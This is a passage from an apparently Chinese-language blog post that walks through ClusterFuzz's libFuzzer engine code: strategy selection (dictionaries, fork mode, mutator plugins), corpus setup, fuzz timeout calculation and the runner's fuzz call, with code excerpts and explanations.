&quot;&quot;&quot;Add recommended dictionary from GCS to existing .dict file or create</span><br><span class="line">  a new one and update the arguments as needed.</span><br><span class="line">  This function modifies |arguments| list in some cases.&quot;&quot;&quot;</span><br><span class="line">  recommended_dictionary_path = os.path.join(</span><br><span class="line">      fuzzer_utils.get_temp_dir(),</span><br><span class="line">      dictionary_manager.RECOMMENDED_DICTIONARY_FILENAME)</span><br><span class="line"></span><br><span class="line">  dict_manager = dictionary_manager.DictionaryManager(fuzzer_name)</span><br><span class="line"></span><br><span class="line">  try:</span><br><span class="line">    # Bail out if cannot download recommended dictionary from GCS.</span><br><span class="line">    if not dict_manager.download_recommended_dictionary_from_gcs(</span><br><span class="line">        recommended_dictionary_path):</span><br><span class="line">      return False</span><br><span class="line">  except Exception as ex:</span><br><span class="line">    logs.log_error(</span><br><span class="line">        &apos;Exception downloading recommended dictionary:\n%s.&apos; % str(ex))</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">  # Bail out if the downloaded dictionary is empty.</span><br><span class="line">  if not os.path.getsize(recommended_dictionary_path):</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">  # Check if there is an existing dictionary file in arguments.</span><br><span class="line">  original_dictionary_path = fuzzer_utils.extract_argument(</span><br><span class="line">      arguments, constants.DICT_FLAG)</span><br><span class="line">  merged_dictionary_path = (</span><br><span class="line">      original_dictionary_path or</span><br><span class="line">      dictionary_manager.get_default_dictionary_path(fuzzer_path))</span><br><span class="line">  merged_dictionary_path += MERGED_DICT_SUFFIX</span><br><span class="line"></span><br><span class="line">  dictionary_manager.merge_dictionary_files(original_dictionary_path,</span><br><span class="line">                                            recommended_dictionary_path,</span><br><span class="line">                                            merged_dictionary_path)</span><br><span class="line">  arguments.append(constants.DICT_FLAG + merged_dictionary_path)</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure><h4 id="VALUE-PROFILE-STRATEGY"><a href="#VALUE-PROFILE-STRATEGY" class="headerlink" title="VALUE_PROFILE_STRATEGY"></a>VALUE_PROFILE_STRATEGY</h4><p>这个简单，就是添加参数-use_value_profile=1，下面是帮助信息，应该是使用特殊的值来指导模糊测试</p><p>Experimental. Use value profile to guide fuzzing.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if strategy_pool.do_strategy(strategy.VALUE_PROFILE_STRATEGY):</span><br><span class="line">    arguments.append(constants.VALUE_PROFILE_ARGUMENT)</span><br><span class="line">    fuzzing_strategies.append(strategy.VALUE_PROFILE_STRATEGY.name)</span><br></pre></td></tr></table></figure><h4 id="FORK-STRATEGY"><a href="#FORK-STRATEGY" class="headerlink" title="FORK_STRATEGY"></a>FORK_STRATEGY</h4><p>这个是fork策略，从MAX_FUZZ_THREADS获取max_fuzz_threads，默认值是1，</p><p>-fork=的参数是cpu的核心数除以max_fuzz_threads，最小为1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Do not use fork mode for DFT-based fuzzing. This is needed in order to</span><br><span class="line"> # collect readable and actionable logs from fuzz targets running with DFT.</span><br><span class="line"> if (not is_fuchsia and not is_android and not is_ephemeral and</span><br><span class="line">     not use_dataflow_tracing and</span><br><span class="line">     strategy_pool.do_strategy(strategy.FORK_STRATEGY)):</span><br><span class="line">   max_fuzz_threads = environment.get_value(&apos;MAX_FUZZ_THREADS&apos;, 1)</span><br><span class="line">   num_fuzz_processes = max(1, utils.cpu_count() // max_fuzz_threads)</span><br><span class="line">   arguments.append(&apos;%s%d&apos; % (constants.FORK_FLAG, num_fuzz_processes))</span><br><span class="line">   fuzzing_strategies.append(</span><br><span class="line">       &apos;%s_%d&apos; % (strategy.FORK_STRATEGY.name, num_fuzz_processes))</span><br></pre></td></tr></table></figure><h4 id="MUTATOR-PLUGIN-STRATEGY"><a href="#MUTATOR-PLUGIN-STRATEGY" class="headerlink" title="MUTATOR_PLUGIN_STRATEGY"></a>MUTATOR_PLUGIN_STRATEGY</h4><p>这个是use_mutator_plugin函数通过设置<code>extra_env[&#39;LD_PRELOAD&#39;] = mutator_plugin_path</code>来生效的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">extra_env = &#123;&#125;</span><br><span class="line">if (strategy_pool.do_strategy(strategy.MUTATOR_PLUGIN_STRATEGY) and</span><br><span class="line">    use_mutator_plugin(target_name, extra_env)):</span><br><span class="line">  fuzzing_strategies.append(strategy.MUTATOR_PLUGIN_STRATEGY.name)</span><br></pre></td></tr></table></figure><h4 id="PEACH-GRAMMAR-MUTATION-STRATEGY"><a href="#PEACH-GRAMMAR-MUTATION-STRATEGY" class="headerlink" title="PEACH_GRAMMAR_MUTATION_STRATEGY"></a>PEACH_GRAMMAR_MUTATION_STRATEGY</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (not has_existing_mutator_strategy(fuzzing_strategies) and</span><br><span class="line">      strategy_pool.do_strategy(strategy.PEACH_GRAMMAR_MUTATION_STRATEGY) and</span><br><span class="line">      use_peach_mutator(extra_env, grammar)):</span><br><span class="line">    fuzzing_strategies.append(</span><br><span class="line">        &apos;%s_%s&apos; % (strategy.PEACH_GRAMMAR_MUTATION_STRATEGY.name, grammar))</span><br></pre></td></tr></table></figure><p>首先假如fuzzing_strategies已经有以下策略的其中一个，就不执行PEACH_GRAMMAR_MUTATION_STRATEGY策略了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MUTATOR_STRATEGIES = [</span><br><span class="line">    strategy.PEACH_GRAMMAR_MUTATION_STRATEGY.name,</span><br><span class="line">    strategy.MUTATOR_PLUGIN_STRATEGY.name,</span><br><span class="line">    strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY.name</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>PEACH_GRAMMAR_MUTATION_STRATEGY策略也是通过环境变量来生效的，在use_peach_mutator函数中主要是下面环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Set title and pit environment variables</span><br><span class="line">  extra_env[&apos;PIT_FILENAME&apos;] = pit_path</span><br><span class="line">  extra_env[&apos;PIT_TITLE&apos;] = grammar</span><br><span class="line"># Set LD_PRELOAD.</span><br><span class="line">  peach_path = os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;src&apos;, &apos;peach.so&apos;)</span><br><span class="line">  extra_env[&apos;LD_PRELOAD&apos;] = peach_path</span><br><span class="line"># Set Python path.</span><br><span class="line">  new_path = [</span><br><span class="line">      os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;src&apos;),</span><br><span class="line">      os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;third_party&apos;, &apos;peach&apos;),</span><br><span class="line">  ] + sys.path</span><br><span class="line"></span><br><span class="line">  extra_env[&apos;PYTHONPATH&apos;] = os.pathsep.join(new_path)</span><br></pre></td></tr></table></figure><h4 id="MUTATOR-PLUGIN-RADAMSA-STRATEGY"><a href="#MUTATOR-PLUGIN-RADAMSA-STRATEGY" class="headerlink" title="MUTATOR_PLUGIN_RADAMSA_STRATEGY"></a>MUTATOR_PLUGIN_RADAMSA_STRATEGY</h4><p>这里的逻辑也是跟上面一样，MUTATOR_STRATEGIES其中之一已经存在，就不执行策略了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (not has_existing_mutator_strategy(fuzzing_strategies) and</span><br><span class="line">      strategy_pool.do_strategy(strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY) and</span><br><span class="line">      use_radamsa_mutator_plugin(extra_env)):</span><br><span class="line">    fuzzing_strategies.append(strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY.name)</span><br></pre></td></tr></table></figure><p>use_radamsa_mutator_plugin函数就是通过环境变量LD_PRELOAD生效的，<code>extra_env[&#39;LD_PRELOAD&#39;] = radamsa_path</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def use_radamsa_mutator_plugin(extra_env):</span><br><span class="line">  &quot;&quot;&quot;Decide whether to use Radamsa in process. If yes, add the path to the</span><br><span class="line">  radamsa shared object to LD_PRELOAD in |extra_env| and return True.&quot;&quot;&quot;</span><br><span class="line">  # Radamsa will only work on LINUX ASAN jobs.</span><br><span class="line">  # TODO(mpherman): Include architecture info in job definition and exclude</span><br><span class="line">  # i386.</span><br><span class="line">  if environment.is_lib() or not is_linux_asan():</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">  radamsa_path = os.path.join(environment.get_platform_resources_directory(),</span><br><span class="line">                              &apos;radamsa&apos;, &apos;libradamsa.so&apos;)</span><br><span class="line"></span><br><span class="line">  logs.log(&apos;Using Radamsa mutator plugin : %s&apos; % radamsa_path)</span><br><span class="line">  extra_env[&apos;LD_PRELOAD&apos;] = radamsa_path</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure><h3 id="libfuzzer-pick-strategies之后"><a href="#libfuzzer-pick-strategies之后" class="headerlink" title="libfuzzer.pick_strategies之后"></a>libfuzzer.pick_strategies之后</h3><p>展开参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arguments.extend(strategy_info.arguments)</span><br></pre></td></tr></table></figure><p>解压corpus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Check for seed corpus and add it into corpus directory.</span><br><span class="line">engine_common.unpack_seed_corpus_if_needed(target_path, corpus_dir)</span><br></pre></td></tr></table></figure><p>假如策略里面有CORPUS_SUBSET_STRATEGY，选择一些数量的corpus作为初始的corpus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Pick a few testcases from our corpus to use as the initial corpus.</span><br><span class="line">subset_size = engine_common.random_choice(</span><br><span class="line">    engine_common.CORPUS_SUBSET_NUM_TESTCASES)</span><br><span class="line"></span><br><span class="line">if (not strategy_info.use_dataflow_tracing and</span><br><span class="line">    strategy_pool.do_strategy(strategy.CORPUS_SUBSET_STRATEGY) and</span><br><span class="line">    shell.get_directory_file_count(corpus_dir) &gt; subset_size):</span><br><span class="line">  # Copy |subset_size| testcases into &apos;subset&apos; directory.</span><br><span class="line">  corpus_subset_dir = self._create_temp_corpus_dir(&apos;subset&apos;)</span><br><span class="line">  libfuzzer.copy_from_corpus(corpus_subset_dir, corpus_dir, subset_size)</span><br><span class="line">  strategy_info.fuzzing_strategies.append(</span><br><span class="line">      strategy.CORPUS_SUBSET_STRATEGY.name + &apos;_&apos; + str(subset_size))</span><br><span class="line">  strategy_info.additional_corpus_dirs.append(corpus_subset_dir)</span><br><span class="line">else:</span><br><span class="line">  strategy_info.additional_corpus_dirs.append(corpus_dir)</span><br></pre></td></tr></table></figure><p>存在字典参数，检查字典文件参数，并检查字典是否存在</p><p>如果不存在字典参数，则检查%target_binary_name%.dict是否存在</p><p>最后还检查字典的格式并尝试修复，比如缺少双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Check dict argument to make sure that it&apos;s valid.</span><br><span class="line">   dict_path = fuzzer_utils.extract_argument(</span><br><span class="line">       arguments, constants.DICT_FLAG, remove=False)</span><br><span class="line">   if dict_path and not os.path.exists(dict_path):</span><br><span class="line">     logs.log_error(&apos;Invalid dict %s for %s.&apos; % (dict_path, target_path))</span><br><span class="line">     fuzzer_utils.extract_argument(arguments, constants.DICT_FLAG)</span><br><span class="line">  </span><br><span class="line"># If there&apos;s no dict argument, check for %target_binary_name%.dict file.</span><br><span class="line">   dict_path = fuzzer_utils.extract_argument(</span><br><span class="line">       arguments, constants.DICT_FLAG, remove=False)</span><br><span class="line">   if not dict_path:</span><br><span class="line">     dict_path = dictionary_manager.get_default_dictionary_path(target_path)</span><br><span class="line">     if os.path.exists(dict_path):</span><br><span class="line">       arguments.append(constants.DICT_FLAG + dict_path)</span><br><span class="line"></span><br><span class="line"># If we have a dictionary, correct any items that are not formatted properly</span><br><span class="line">   # (e.g. quote items that are missing them).</span><br><span class="line">   dictionary_manager.correct_if_needed(dict_path)</span><br></pre></td></tr></table></figure><p>prepare函数最后调用process_strategies，返回一个stats，哪个策略开没开，或者策略选择的值，就是strategies变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strategies = stats.process_strategies(</span><br><span class="line">       strategy_info.fuzzing_strategies, name_modifier=lambda x: x)</span><br><span class="line">   return LibFuzzerOptions(</span><br><span class="line">       corpus_dir, arguments, strategies, strategy_info.additional_corpus_dirs,</span><br><span class="line">       strategy_info.extra_env, strategy_info.use_dataflow_tracing,</span><br><span class="line">       strategy_info.is_mutations_run)</span><br></pre></td></tr></table></figure><h2 id="fuzz的最大时间"><a href="#fuzz的最大时间" class="headerlink" title="fuzz的最大时间"></a>fuzz的最大时间</h2><p>从环境变量获取要fuzz的时长，减去在fuzz中的其他操作的时间，比如合并样本，字典分析等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;)</span><br><span class="line">additional_processing_time = engine_impl.fuzz_additional_processing_timeout(</span><br><span class="line">    options)</span><br><span class="line">fuzz_test_timeout -= additional_processing_time</span><br><span class="line">if fuzz_test_timeout &lt;= 0:</span><br><span class="line">  raise FuzzTaskException(</span><br><span class="line">      f&apos;Invalid engine timeout: &apos;</span><br><span class="line">      f&apos;&#123;fuzz_test_timeout&#125; - &#123;additional_processing_time&#125;&apos;)</span><br></pre></td></tr></table></figure><h2 id="实际fuzz"><a href="#实际fuzz" class="headerlink" title="实际fuzz"></a>实际fuzz</h2><p>实际fuzz就是下面这行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = engine_impl.fuzz(target_path, options, testcase_directory,</span><br><span class="line">                            fuzz_test_timeout)</span><br></pre></td></tr></table></figure><p>跟进这个fuzz函数</p><p>下面的第一行profiler是性能分析相关的，假如设置了USE_PYTHON_PROFILER，并且不是False，就会启动Google Cloud Profiler</p><p>第二行就是通过libfuzzer.get_runner一般正常情况是返回的是LibFuzzerRunner(fuzzer_path)</p><p>第三行是设置sanitizer_options，比如exitcode为77</p><p>第四行创建一个临时的目录作为corpus的目录，之后地5行跟options.fuzz_corpus_dirs合并变成一个corpus_directories数组</p><p>之后调用runner.fuzz，就是实际起fuzz了</p><p>fuzz之后就简单概括下：<br>1、将fuzzer的输出splitlines<br>2、根据log看看有没有crash，并提取crash的文件的路径<br>3、如果libfuzzer的返回值非0，但是又没找到crash文件，那么这个应该是启动的时候就崩溃了，这时使用空文件作为crash文件<br>4、根据log_lines的信息，设置一些stats的值，比如crash_count，slow_unit_count，timeout_count，edges_total等<br>5、删除一些影响merge和字典分析的参数，比如-fork，-max_len，-runs等<br>6、给复现crash设置更大的超时时间<br>7、复制crash文件到主crash目录<br>8、从log中生成推荐字典<br>9、返回fuzz的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">profiler.start_if_needed(&apos;libfuzzer_fuzz&apos;)</span><br><span class="line">   runner = libfuzzer.get_runner(target_path)</span><br><span class="line">   libfuzzer.set_sanitizer_options(target_path, fuzz_options=options)</span><br><span class="line"></span><br><span class="line">   # Directory to place new units.</span><br><span class="line">   new_corpus_dir = self._create_temp_corpus_dir(&apos;new&apos;)</span><br><span class="line"></span><br><span class="line">   corpus_directories = [new_corpus_dir] + options.fuzz_corpus_dirs</span><br><span class="line">   fuzz_result = runner.fuzz(</span><br><span class="line">       corpus_directories,</span><br><span class="line">       fuzz_timeout=max_time,</span><br><span class="line">       additional_args=options.arguments,</span><br><span class="line">       artifact_prefix=reproducers_dir,</span><br><span class="line">       extra_env=options.extra_env)</span><br><span class="line"></span><br><span class="line">log_lines = fuzz_result.output.splitlines()</span><br><span class="line">   # Output can be large, so save some memory by removing reference to the</span><br><span class="line">   # original output which is no longer needed.</span><br><span class="line">   fuzz_result.output = None</span><br><span class="line"></span><br><span class="line">   # Check if we crashed, and get the crash testcase path.</span><br><span class="line">   crash_testcase_file_path = runner.get_testcase_path(log_lines)</span><br><span class="line"></span><br><span class="line">   # If we exited with a non-zero return code with no crash file in output from</span><br><span class="line">   # libFuzzer, this is most likely a startup crash. Use an empty testcase to</span><br><span class="line">   # to store it as a crash.</span><br><span class="line">   if not crash_testcase_file_path and fuzz_result.return_code:</span><br><span class="line">     crash_testcase_file_path = self._create_empty_testcase_file(</span><br><span class="line">         reproducers_dir)</span><br><span class="line"></span><br><span class="line">   # Parse stats information based on libFuzzer output.</span><br><span class="line">   parsed_stats = libfuzzer.parse_log_stats(log_lines)</span><br><span class="line"></span><br><span class="line">   # Extend parsed stats by additional performance features.</span><br><span class="line">   parsed_stats.update(</span><br><span class="line">       stats.parse_performance_features(log_lines, options.strategies,</span><br><span class="line">                                        options.arguments))</span><br><span class="line"></span><br><span class="line">   # Set some initial stat overrides.</span><br><span class="line">   timeout_limit = fuzzer_utils.extract_argument(</span><br><span class="line">       options.arguments, constants.TIMEOUT_FLAG, remove=False)</span><br><span class="line"></span><br><span class="line">   expected_duration = runner.get_max_total_time(max_time)</span><br><span class="line">   actual_duration = int(fuzz_result.time_executed)</span><br><span class="line">   fuzzing_time_percent = 100 * actual_duration / float(expected_duration)</span><br><span class="line">   parsed_stats.update(&#123;</span><br><span class="line">       &apos;timeout_limit&apos;: int(timeout_limit),</span><br><span class="line">       &apos;expected_duration&apos;: expected_duration,</span><br><span class="line">       &apos;actual_duration&apos;: actual_duration,</span><br><span class="line">       &apos;fuzzing_time_percent&apos;: fuzzing_time_percent,</span><br><span class="line">   &#125;)</span><br><span class="line"></span><br><span class="line">   # Remove fuzzing arguments before merge and dictionary analysis step.</span><br><span class="line">   merge_arguments = options.arguments[:]</span><br><span class="line">   libfuzzer.remove_fuzzing_arguments(merge_arguments, is_merge=True)</span><br><span class="line">   self._merge_new_units(target_path, options.corpus_dir, new_corpus_dir,</span><br><span class="line">                         options.fuzz_corpus_dirs, merge_arguments,</span><br><span class="line">                         parsed_stats)</span><br><span class="line"></span><br><span class="line">   fuzz_logs = &apos;\n&apos;.join(log_lines)</span><br><span class="line">   crashes = []</span><br><span class="line">   if crash_testcase_file_path:</span><br><span class="line">     reproduce_arguments = options.arguments[:]</span><br><span class="line">     libfuzzer.remove_fuzzing_arguments(reproduce_arguments)</span><br><span class="line"></span><br><span class="line">     # Use higher timeout for reproduction.</span><br><span class="line">     libfuzzer.fix_timeout_argument_for_reproduction(reproduce_arguments)</span><br><span class="line"></span><br><span class="line">     # Write the new testcase.</span><br><span class="line">     # Copy crash testcase contents into the main testcase path.</span><br><span class="line">     crashes.append(</span><br><span class="line">         engine.Crash(crash_testcase_file_path, fuzz_logs, reproduce_arguments,</span><br><span class="line">                      actual_duration))</span><br><span class="line"></span><br><span class="line">   libfuzzer.analyze_and_update_recommended_dictionary(</span><br><span class="line">       runner, project_qualified_fuzzer_name, log_lines, options.corpus_dir,</span><br><span class="line">       merge_arguments)</span><br><span class="line"></span><br><span class="line">   return engine.FuzzResult(fuzz_logs, fuzz_result.command, crashes,</span><br><span class="line">                            parsed_stats, fuzz_result.time_executed)</span><br></pre></td></tr></table></figure><p>最后进去runner.fuzz函数看看，首先找到LibFuzzerRunner，发现fuzz函数实际调用的是LibFuzzerCommon.fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class LibFuzzerRunner(new_process.UnicodeProcessRunner, LibFuzzerCommon):</span><br><span class="line">  &quot;&quot;&quot;libFuzzer runner (when minijail is not used).&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">  def __init__(self, executable_path, default_args=None):</span><br><span class="line">    &quot;&quot;&quot;Inits the LibFuzzerRunner.</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">      executable_path: Path to the fuzzer executable.</span><br><span class="line">      default_args: Default arguments to always pass to the fuzzer.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    super().__init__(executable_path=executable_path, default_args=default_args)</span><br><span class="line"></span><br><span class="line">  def fuzz(self,</span><br><span class="line">           corpus_directories,</span><br><span class="line">           fuzz_timeout,</span><br><span class="line">           artifact_prefix=None,</span><br><span class="line">           additional_args=None,</span><br><span class="line">           extra_env=None):</span><br><span class="line">    &quot;&quot;&quot;LibFuzzerCommon.fuzz override.&quot;&quot;&quot;</span><br><span class="line">    additional_args = copy.copy(additional_args)</span><br><span class="line">    if additional_args is None:</span><br><span class="line">      additional_args = []</span><br><span class="line"></span><br><span class="line">    return LibFuzzerCommon.fuzz(self, corpus_directories, fuzz_timeout,</span><br><span class="line">                                artifact_prefix, additional_args, extra_env)</span><br></pre></td></tr></table></figure><p>找到LibFuzzerCommon.fuzz，里面处理了一下-artifact_prefix ，加上-max_total_time=和-print_final_stats=1，最后再加corpus_directories列表，最后就调用run_and_wait函数了（就是最多等待fuzz_timeout时间就退出，或者libfuzzer自动退出）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">def fuzz(self,</span><br><span class="line">           corpus_directories,</span><br><span class="line">           fuzz_timeout,</span><br><span class="line">           artifact_prefix=None,</span><br><span class="line">           additional_args=None,</span><br><span class="line">           extra_env=None):</span><br><span class="line">    &quot;&quot;&quot;Running fuzzing command.</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">      corpus_directories: List of corpus directory paths to be passed to</span><br><span class="line">          libFuzzer.</span><br><span class="line">      fuzz_timeout: The maximum time in seconds that libFuzzer is allowed to run</span><br><span class="line">          for.</span><br><span class="line">      artifact_prefix: The directory to store new fuzzing artifacts (crashes,</span><br><span class="line">          timeouts, slow units)</span><br><span class="line">      additional_args: A sequence of additional arguments to be passed to the</span><br><span class="line">          executable.</span><br><span class="line">      extra_env: A dictionary containing environment variables and their values.</span><br><span class="line">          These will be added to the environment of the new process.</span><br><span class="line"></span><br><span class="line">    Returns:</span><br><span class="line">      A process.ProcessResult.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    additional_args = copy.copy(additional_args)</span><br><span class="line">    if additional_args is None:</span><br><span class="line">      additional_args = []</span><br><span class="line"></span><br><span class="line">    max_total_time = self.get_max_total_time(fuzz_timeout)</span><br><span class="line">    if any(arg.startswith(constants.FORK_FLAG) for arg in additional_args):</span><br><span class="line">      max_total_time -= self.LIBFUZZER_FORK_MODE_CLEAN_EXIT_TIME</span><br><span class="line">    assert max_total_time &gt; 0</span><br><span class="line"></span><br><span class="line">    # Old libFuzzer jobs specify -artifact_prefix through additional_args</span><br><span class="line">    if artifact_prefix:</span><br><span class="line">      additional_args.append(</span><br><span class="line">          &apos;%s%s&apos; % (constants.ARTIFACT_PREFIX_FLAG,</span><br><span class="line">                    self._normalize_artifact_prefix(artifact_prefix)))</span><br><span class="line"></span><br><span class="line">    additional_args.extend([</span><br><span class="line">        &apos;%s%d&apos; % (constants.MAX_TOTAL_TIME_FLAG, max_total_time),</span><br><span class="line">        constants.PRINT_FINAL_STATS_ARGUMENT,</span><br><span class="line">        # FIXME: temporarily disabled due to a lack of crash information in</span><br><span class="line">        # output.</span><br><span class="line">        # &apos;-close_fd_mask=3&apos;,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    additional_args.extend(corpus_directories)</span><br><span class="line">    return self.run_and_wait(</span><br><span class="line">        additional_args=additional_args,</span><br><span class="line">        timeout=fuzz_timeout - self.SIGTERM_WAIT_TIME,</span><br><span class="line">        terminate_before_kill=True,</span><br><span class="line">        terminate_wait_time=self.SIGTERM_WAIT_TIME,</span><br><span class="line">        max_stdout_len=MAX_OUTPUT_LEN,</span><br><span class="line">   